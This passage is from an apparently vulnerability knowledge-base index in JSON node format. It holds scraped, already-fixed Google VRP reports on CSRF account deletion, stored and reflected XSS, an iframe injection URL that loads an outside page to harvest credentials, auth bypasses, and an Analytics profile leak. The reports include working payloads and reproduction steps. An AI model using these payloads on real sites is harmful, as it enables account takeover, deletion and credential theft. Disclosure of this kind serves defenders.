"text/plain", "start_char_idx": 0, "end_char_idx": 2860, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "21c33561-85b3-4ef0-aca2-d690490d0004": {"__data__": {"id_": "21c33561-85b3-4ef0-aca2-d690490d0004", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_904801.txt", "file_name": "20250408_175714_904801.txt", "file_type": "text/plain", "file_size": 1262, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a8aaacbb-9b9e-4d5b-9ecc-5e935a8a6cb5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_904801.txt", "file_name": "20250408_175714_904801.txt", "file_type": "text/plain", "file_size": 1262, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "db4326ada92bb56d57ea7ba4582d54ce6945203b8644e6ead16523e39469aa77", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nCSRF\r\nReported by:\r\nIrwan One\r\nGoogle VRP\r\ntriaged\r\n17:23 | Nov 22, 2021\r\naccepted\r\n21:14 | Nov 22, 2021\r\nfixed\r\n13:24 | Feb 10, 2022\r\nreward decided\r\n$100\r\nSummary:\r\nCSRF\r\nProduct:\r\nhttps://creators.google/api/forgetme/\r\nURL:\r\nhttps://creators.google/api/forgetme/\r\nVulnerability type:\r\nCross-site request forgery (CSRF)\r\nDetails\r\nhi google,\r\ni'm testing your creator feature and see that csrf token doesn't work in delete account by using GET method in parameter\r\nhttps://creators.google/api/forgetme/\r\nthen account is deleted.\r\nProduction steps:\r\nSign in\r\nhttps://creators.google/\r\nthen save the csrf payload with the html extension, (csrf.html)\r\n<html>\r\n<!-- CSRF PoC - generated by Burp Suite Professional -->\r\n<body>\r\n<script>history.pushState('', '', '/')</script>\r\n <form action=\"https://creators.google/api/forgetme/\">\r\n   <input type=\"submit\" value=\"Submit request\" />\r\n </form>\r\n</body>\r\n</html>\r\nsend it to the victim, the victim's account will be completely deleted.\r\nImpact :\r\ndelete any account via CSRF Bug, because token is not validated by GET method in delete account feature.\r\nAttack scenario\r\nDelete mass creator google account by sending csrf to victim\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1246, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "10d49434-a55b-4909-ad96-5604dc606a2f": {"__data__": {"id_": "10d49434-a55b-4909-ad96-5604dc606a2f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_936043.txt", "file_name": "20250408_175714_936043.txt", "file_type": "text/plain", "file_size": 969, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b5d66284-5809-4926-9c7d-c3f0f6275b03", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_936043.txt", "file_name": "20250408_175714_936043.txt", "file_type": "text/plain", "file_size": 969, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8ce1c63429533e17bca0e0d36918da18b20540fd4b632b01653191a781ebe894", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nStored XSS Via Project Name\r\nReported by:\r\nRio Mulyadi Pulungan\r\nGoogle VRP\r\ntriaged\r\n23:05 | Sep 22, 2021\r\naccepted\r\n01:15 | Sep 23, 2021\r\nfixed\r\n04:26 | Apr 9, 2022\r\nreward decided\r\n$100\r\nSummary:\r\nStored XSS Via Project Name\r\nProduct:\r\nhttps://games.withgoogle.com/\r\nURL:\r\nhttps://games.withgoogle.com/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nSummary\r\nWhen solve the quiz, i just figured in project name not filter input from user and leads to Stored XSS Vulnerability\r\nStep to reproduce\r\nGo to\r\nhttps://games.withgoogle.com/prepareforlaunch\r\nClick \"Launch Quiz\" Button\r\nFill project name with XSS payload\r\n\"><img src=x onerror=prompt(document.domain)>\r\nFinish the quiz, and in the end the XSS will be triggered\r\nAttack scenario\r\nAttacker can share the URL to affected other people\r\nPlanned disclosure date:\r\nSat Sep 25 2021 00:00:00 GMT+0700 (Indochina Time)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 953, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "60335f50-e455-4181-94b6-881857817346": {"__data__": {"id_": "60335f50-e455-4181-94b6-881857817346", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_999098.txt", "file_name": "20250408_175714_999098.txt", "file_type": "text/plain", "file_size": 2258, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2e1f6904-858a-482a-921e-3251f8c3c0a2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_999098.txt", "file_name": "20250408_175714_999098.txt", "file_type": "text/plain", "file_size": 2258, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "981e8fbc6fd0f9fae286af6cb8d33bce0dfcf15c006ae15ec04a8526f5c1ac2d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nOnsite Iframe injection at Customer support page leads to harvest user problems & credentials\r\nReported by:\r\nBasavaraj Banakar\r\nGoogle VRP\r\ntriaged\r\n01:21 | Sep 16, 2021\r\naccepted\r\n02:00 | Sep 16, 2021\r\nfixed\r\n22:22 | Jan 21, 2022\r\nSummary:\r\nOnsite Iframe injection at Customer support page leads to harvest user problems & credentials\r\nProduct:\r\nAppsheet\r\nURL:\r\nhttps://www.appsheet.com/Support\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi, Team this vulnerability was found in Appsheet which is the acquisition of Google, Acquired on Jan 15, 2020\r\nVulnerability\r\n: Onsite Iframe injection at Customer support page leads to harvest user problems & credentials\r\nDescription\r\n:  An iFrame injection is a very common cross-site scripting (or XSS) attack. It consists of one or more iFrame tags that have been inserted into a page or post\u2019s content and typically downloads an executable program or conducts other actions that compromise the site visitors\u2019 computers. In the best case, Google may label the site \u201cmalicious.\u201d The worst case is that the site owner and visitors end up with malware-infected computers.\r\nframe injection, which occurs when a frame on a vulnerable web page displays another web page via a user-controllable input.\r\nSteps to Reproduce\r\n:\r\nI Have hosted a malicious code in my server i.e\r\nhttps://www.basubanakar.com/con.html\r\nNow By using html injection vulnerability on Appsheet main domain i.e on customer support page , I will call my malicious code using html injection or iframe injection. ex:  Here vulnerable parameter is \"dFR[doc_type][0]=\" Now as an attacker I will craft that url as:\r\nhttps://www.appsheet.com/Support?q=%20&dFR[doc_type][0]=%3Ciframe%20src=%22https://www.basubanakar.com/con.html%22%20width=1200%20height=1000%20/%3E\r\nNow when victim opens this links I am getting his creds etc by using form.\r\nProof of concept\r\n:  See this Below video\r\nhttps://drive.google.com/file/d/1xNCq3yxVkzhm4MKzg0_yFtYcSO4XVWZl/view?usp=sharing\r\nAttack scenario\r\nAny attacker can exploit this vulnerability because its present mainly on Customer support page\r\nwhere he can inject his own contact form and he can harvest victim creds by that.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2234, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b780631a-a3e0-4618-b054-8ff7ef57def2": {"__data__": {"id_": "b780631a-a3e0-4618-b054-8ff7ef57def2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_030528.txt", "file_name": "20250408_175715_030528.txt", "file_type": "text/plain", "file_size": 2067, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5555f464-dbed-4a52-aa0a-79a3f4a3dee0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_030528.txt", "file_name": "20250408_175715_030528.txt", "file_type": "text/plain", "file_size": 2067, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "28308d62bbd66640bd349f0e911c22594fd66eb42004d42236497340fd34803a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nReflected XSS(CROSS SITE SCRIPTING) in https://www.waze.com\r\nReported by:\r\nAman Singh\r\nGoogle VRP\r\ntriaged\r\n17:29 | Aug 23, 2021\r\naccepted\r\n18:29 | Aug 23, 2021\r\nfixed\r\n04:31 | Oct 16, 2021\r\nreward decided\r\n$100\r\nSummary:\r\nReflected XSS(CROSS SITE SCRIPTING) in\r\nhttps://www.waze.com\r\nProduct:\r\nhttps://www.waze.com\r\nURL:\r\nhttps://www.waze.com/carpool/companies?city=\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nHi security team, the\r\nhttps://waze.com\r\nwebsite is your. i found a interesting vulnerability in your website is cross site scripting and HTML injection.let me explain little bit about cross site scripting.cross site scripting is attack. when and application receives data in an HTTP request and includes that data with the immediate response in unsafe way.in a simple way attacker can put malicious payload into a website and website reflected back those payload.so attacker can easily takeover the account and steal victim cookie.\r\nAttack scenario\r\ni am testing in\r\nhttps://waze.com\r\nwebsite and i found a interesting endpoint\r\nhttps://www.waze.com/carpool/companies?city=\r\nthis URL is vulnerable to cross site scripting. i was checking the website is vulnerable or not to XSS i insert a payload end to the URL and payload was trigger. maybe website doesn't properly sanitized a input.\r\nstep to reproduce.\r\n1: go to\r\nhttps://www.waze.com/carpool/companies?city=\r\n2: and add a payload \r\npayload => \"><img src=x onerror=alert(document.domain)>\r\n3: XSS will be triggered.\r\ni think pop is enough my side to show the XSS vulnerability.\r\nIMPACT:\r\nthe impact reflected xss is high.an attacker can impersonate a legitimate user and take over their account.if a victim user has administrative privileges, it might lead to severe damage such as modification in code or database to further weaken the security of the web application, depending on the rights of the account and the web application\r\nReporter would like to donate a possible VRP reward to charity.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2051, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ed5d4c2d-5e81-403f-91cc-dce49e7c993f": {"__data__": {"id_": "ed5d4c2d-5e81-403f-91cc-dce49e7c993f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_061981.txt", "file_name": "20250408_175715_061981.txt", "file_type": "text/plain", "file_size": 1928, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "973d3d5e-e131-4c51-b72e-614978dc958b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_061981.txt", "file_name": "20250408_175715_061981.txt", "file_type": "text/plain", "file_size": 1928, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "88d15eee4b20f25bcc8b684c680a75914ca0c29372dbfa66730fd5b3f1587001", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://cloud.withgoogle.com/next/\r\nReported by:\r\nAlva Radian\r\nGoogle VRP\r\ntriaged\r\n18:26 | Aug 16, 2021\r\naccepted\r\n22:29 | Aug 17, 2021\r\nfixed\r\n18:50 | Aug 18, 2023\r\nreward decided\r\n$100\r\nExample Payload :\r\n\"><input onfocus=alert(1)>\r\nSteps to reproduce:\r\nGo to\r\nhttps://cloud.withgoogle.com/next/\r\nand click on Register now button\r\nCreate an account with your email and fill the First Name and Last Name with XSS payload\r\nThen click on Save button (make sure for capture the request before click on Save button), in http request, you will saw request like this :\r\nPOST /identitytoolkit/v3/relyingparty/setAccountInfo?key=AIzaSyCpYSl87CyGlI8d9-FQ_srX9PYjTfYGiwg HTTP/1.1\r\nHost: www.googleapis.com\r\nConnection: close\r\nContent-Length: 1063\r\nsec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"\r\nX-Client-Version: Chrome/JsCore/8.3.1/FirebaseUI-web\r\nsec-ch-ua-mobile: ?0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\r\nX-Firebase-Locale: en\r\nContent-Type: application/json\r\nAccept: */*\r\nOrigin: https://cloud.withgoogle.com\r\nX-Client-Data: CJa2yQEIpLbJAQjBtskBCKmdygEIjJ7LAQiioMsBCNzyywEI7/LLAQjO9ssBCLT4ywEInvnLAQj4+csBCL39ywE=\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer: https://cloud.withgoogle.com/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n{\"idToken\":\"eOKEN,\"displayName\":\"&lt;input onfocus=alert('test')&gt;,\"returnSecureToken\":true}\r\nSee the payload was encoded, replace the encoded payload to new payload(not encoded payload)\r\nForward the request and verify the account\r\nNow login to account and click on profile then inspect element you will see the XSS payload get blocked by CSP(see on images xss-cloud.withgoogle.com.png)\r\nBrowser/OS:\r\nChrome/Windows 10\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1912, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e59ee73a-da68-46f9-817c-2365fb52b74c": {"__data__": {"id_": "e59ee73a-da68-46f9-817c-2365fb52b74c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_093489.txt", "file_name": "20250408_175715_093489.txt", "file_type": "text/plain", "file_size": 885, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ec5b012a-48ca-4a21-b22b-03483fd9d265", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_093489.txt", "file_name": "20250408_175715_093489.txt", "file_type": "text/plain", "file_size": 885, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "55a6efc8d7d4ea76fdd4a1d784cc4d68160966220bde52513c6907a2d73155c9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://script.google.com/\r\nReported by:\r\nVaibhav Prajapati\r\nGoogle VRP\r\ntriaged\r\n16:44 | Aug 13, 2021\r\nclosed\r\n18:46 | Aug 13, 2021\r\naccepted\r\n00:39 | Sep 24, 2021\r\nfixed\r\n14:02 | Apr 9, 2022\r\nreward decided\r\n$1,337\r\nSummary: Improper Implementation Of Web Application Access Conrol On script.google.com\r\nSteps to reproduce:\r\nDeploy New App With Access Control  \"Anyone Google Account\" And Copy-Paste The URL To The Incognito Tab Of The Browser Logged In WIth Different Google Account\r\nNow Update The Deployment With Access Control 'Only Myself' And Again Open The App With Different Google Account In Incognito Tab Or Another Browser, The App Is Still Accessible\r\nPoC :-\r\nhttps://youtu.be/q3-i4XY8hJE\r\nAttack scenario:\r\nAnyone Can Access Privately The Deployed With Google Account\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 869, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a00ae6dc-b0d5-4071-a179-80216ca4dca9": {"__data__": {"id_": "a00ae6dc-b0d5-4071-a179-80216ca4dca9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_202124.txt", "file_name": "20250408_175717_202124.txt", "file_type": "text/plain", "file_size": 3608, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "fe136642-90cd-4683-b2ba-6bb03d9fe89c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_202124.txt", "file_name": "20250408_175717_202124.txt", "file_type": "text/plain", "file_size": 3608, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8dea4b385bfabc1f287b70cf1b3c1a189e7bca8bb16612fae668b0b2ed042911", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in analytics.google.com\r\nReported by:\r\nAndre\r\nGoogle VRP\r\ntriaged\r\n19:13 | Jul 27, 2021\r\naccepted\r\n09:57 | Aug 21, 2021\r\nfixed\r\n07:29 | Nov 18, 2021\r\nreward decided\r\n$5,000\r\nSummary: Bug that make possible massive data leak (over 100 million Google users)\r\nVideo with explanation and steps to reproduce:\r\nhttps://youtu.be/WBirMTa5JH0\r\nSteps:\r\nHave a Google Analytics with data from real users\r\nUse some cleaver advanced filtering strategy explained in the video\r\nJoin the Google profile data leaked (gender, age, interests) with the real person by using some other id (transaction id, site user id, newsletter id, ...)\r\nCollect it for all the site users by using Python and Google Analytics API\r\nI tested it with my devices and my Google accounts and the data I was able to leak about my self was correct. \r\nThis was the data I was able to get about my browser without the need to be logged in Google as myself:\r\nGender: male\r\nAge: 35-44\r\n------- Interests -------\r\nAutos & Vehicles/Motor Vehicles (By Brand)/Honda\r\nAutos & Vehicles/Vehicle Shopping/Used Vehicles\r\nComputers & Electronics/Computer Hardware/Computer Peripherals/Computer Monitors & Displays\r\nComputers & Electronics/Computer Hardware/Laptops & Notebooks\r\nComputers & Electronics/Programming/Development Tools\r\nComputers & Electronics/Programming/Java (Programming Language)\r\nComputers & Electronics/Programming/Scripting Languages\r\nInternet & Telecom/Email & Messaging/Email\r\nInternet & Telecom/Web Services/Web Design & Development\r\nShopping/Classifieds\r\n------- Affinity Category -------\r\nBanking & Finance/Avid Investors\r\nFood & Dining/Frequently Dines Out/Diners by Meal/Frequently Eats Dinner Out\r\nFood & Dining/Frequently Dines Out/Diners by Meal/Frequently Eats Lunch Out\r\nHome & Garden/Do-It-Yourselfers\r\nLifestyles & Hobbies/Business Professionals\r\nLifestyles & Hobbies/Outdoor Enthusiasts\r\nMedia & Entertainment/Light TV Viewers\r\nMedia & Entertainment/Movie Lovers\r\nShoppers/Value Shoppers\r\nTechnology/Mobile Enthusiasts\r\nTechnology/Technophiles\r\nTravel/Business Travelers\r\nTravel/Travel Buffs\r\n------- In-Market Segment -------\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles (New)\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles (Used)\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles by Brand/Chevrolet\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles by Brand/Honda\r\nAutos & Vehicles/Motor Vehicles/Motor Vehicles by Type/Hatchbacks\r\nBeauty & Personal Care\r\nBeauty & Personal Care/Makeup & Cosmetics\r\nBusiness Services/Business Technology/Enterprise Software/ERP Solutions\r\nBusiness Services/Business Technology/Web Services\r\nBusiness Services/Business Technology/Web Services/Web Design & Development\r\nComputers & Peripherals/Computer Accessories & Components\r\nComputers & Peripherals/Computer Accessories & Components/Computer Monitors\r\nComputers & Peripherals/Computers\r\nComputers & Peripherals/Computers/Laptops & Notebooks\r\nEducation/Post-Secondary Education\r\nEducation/Test Preparation & Tutoring\r\nEmployment/IT & Technical Jobs\r\nHome & Garden/Home Improvement/Tools\r\nReal Estate/Residential Properties\r\nSoftware/Business & Productivity Software\r\nAttack scenario:\r\nExample 1) An Ecommerce can extract the Google profile (gender, age, interests) of the site visitors and join it to their CRM (Full Name, Email, ...).\r\nExample 2) Some hacker could send the victim a link with one unique id in the url and just by opening this url for at least 3 seconds the hacker would be able to know their Google profile (gender, age, interests).\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3592, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "31d5b344-d5a6-4ee8-895a-371a351bcb39": {"__data__": {"id_": "31d5b344-d5a6-4ee8-895a-371a351bcb39", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_249721.txt", "file_name": "20250408_175717_249721.txt", "file_type": "text/plain", "file_size": 2283, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3004466a-db38-476d-9d5b-4ee726a038a5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_249721.txt", "file_name": "20250408_175717_249721.txt", "file_type": "text/plain", "file_size": 2283, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "751b753cbfb802fc468947918d83b8a9a0626b95814d0a26989472c149341eff", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://docs.google.com/forms/d/\r\nReported by:\r\nJinseo Kim\r\nGoogle VRP\r\nclosed\r\n18:32 | Jul 19, 2021\r\ntriaged\r\n00:29 | Jul 20, 2021\r\naccepted\r\n21:23 | Jul 22, 2021\r\nfixed\r\n16:55 | Feb 2, 2022\r\nreward decided\r\n$3,133.70\r\nSummary: Possible to find 'edit ID form ' 'viewform' ID, which leads to view/edit form if link sharing\r\nSteps to reproduce:\r\nCreate a Google Form, and enter to SEND link without login.\r\nView source, and find 'maestro_new_project_uri' and find the corresponding link(Be aware that the URL is encoded like \\u, decode it)(\r\nhttps://script.google.com/macros/create?mid=\r\n<alphabets>&uiv=2 )\r\nEnter to the link with login(another account) and devtools, and notify it 302s to another link(\r\nhttps://script.google.com/home/projects/create?authuser=0&parent=\r\n<Form ID> )\r\nNotify that form ID of 1. is same as 'parent' parameter of the link of 3.\r\nBrowser/OS: Any\r\nAttack scenario:\r\nUser A([REDACTED_EMAIL]) creates a form, and share(Add collaborators) as link sharing. (\r\nhttps://docs.google.com/forms/d/1C0wLTPaZI7-n2SB82XIzdEhWpPC_B3qoWp7d9t8XimE/edit\r\n)\r\nUser A send the form link(\r\nhttps://docs.google.com/forms/d/e/1FAIpQLSdXjdMIzGCOZWnddsj4O-n5WXCCFbopwOVjYI4PyoadtveXrA/viewform\r\n) to User B([REDACTED_EMAIL]).\r\nUser B enter to the link, view source, and find 'maestro_new_project_uri' and find the corresponding link(Be aware that the URL is encoded like \\u, decode it)(\r\nhttps://script.google.com/macros/create?mid=ACjPJvFfkBR3_kH5D0Xmw5WlA2VbBJVXbIy2DpU2U3cafVDEgLkFrEhRCjLcQi-zNABSMQv7lC7OhPRm2ell-W5TAHAKcAo5u4DB3hp_MPEFTRmNhycl&uiv=2\r\n)\r\nUser B enter to this link with devtools. The link 302s to the link like: (\r\nhttps://script.google.com/home/projects/create?authuser=0&parent=1C0wLTPaZI7-n2SB82XIzdEhWpPC_B3qoWp7d9t8XimE\r\n). As you can see, 'parent' param is the same as the ID of User A's form.\r\nNow User B can craft of the link of the form(\r\nhttps://docs.google.com/forms/d/1C0wLTPaZI7-n2SB82XIzdEhWpPC_B3qoWp7d9t8XimE/edit\r\n).\r\nAs a result, User B can edit the form, view responses, etc.\r\nSo, if the victim had shared(Add collaborators) the form and sent link to the attacker, the attacker can find the edit/response link of the form of the victim.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2267, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "53f42d22-00a6-4c24-8deb-db4460aa98ba": {"__data__": {"id_": "53f42d22-00a6-4c24-8deb-db4460aa98ba", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_297762.txt", "file_name": "20250408_175717_297762.txt", "file_type": "text/plain", "file_size": 1331, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "bd400085-3ca5-4c45-9e82-bf7e70714bfb", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_297762.txt", "file_name": "20250408_175717_297762.txt", "file_type": "text/plain", "file_size": 1331, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "959384934228e72875da252477c4299e305d9c7fb444abbd56b306493363928d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Kaggle\r\nReported by:\r\nMuhammad Ahsan\r\nGoogle VRP\r\ntriaged\r\n21:47 | Jun 2, 2021\r\naccepted\r\n23:07 | Jun 2, 2021\r\nfixed\r\n23:47 | Jun 29, 2021\r\nreward decided\r\n$100\r\nSummary: Stored Cross site scripting on\r\nhttps://kaggle.com\r\nDescription:\r\nStored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.\r\nNote:\r\nThe content security policy is blocking my payload. By dissabling the content security policy in firefox i was able to get popup. To disable csp in firefox go to about:config and type security.csp.enable and select option to disable\r\nSteps to Reproduce:\r\nSignup to\r\nhttps://kaggle.com\r\nCreate dataset and go to discussion\r\nPut your payload in the disscussion \r\n($$ \\unicode{<img src=1 onerror=alert(document.cookie)//} $$)\r\nThe content Security policy is blocking the xss payload but it is vulnerable to xss\r\nImpact:\r\nAttacker would be able to steal cookie and perform malicious things.\r\nAcquisition info:\r\nIt was aquired in 08 Mar 2017 kaggle\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1315, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", 